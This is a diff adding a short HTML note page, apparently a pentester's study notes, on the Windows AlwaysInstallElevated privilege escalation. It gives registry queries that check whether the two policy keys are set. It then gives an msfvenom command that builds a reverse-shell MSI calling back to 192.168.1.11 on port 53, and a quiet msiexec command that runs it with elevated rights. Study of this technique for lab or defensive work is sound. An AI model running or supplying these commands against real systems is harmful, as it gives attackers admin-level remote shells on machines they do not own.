@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>AlwaysInstallElivated</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>AlwaysInstallElivated</h1><br/>MSI files are package files used to install applications. These files run with the permissions of the user trying to install them. Windows allows for these installers to be run with elevated (i.e. admin) privileges. If this is the case, we can generate a malicious MSI file that contains a reverse shell. Two keys must be set to &quot;1&quot; for this to work.<br />HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer<br />---AND---<br />HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer<br /><br />&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br />&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br /># msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o reverse.msi<br />&gt; msiexec /quiet /qn /i C:\PrivEsc\reverse.msi</div></body></html>
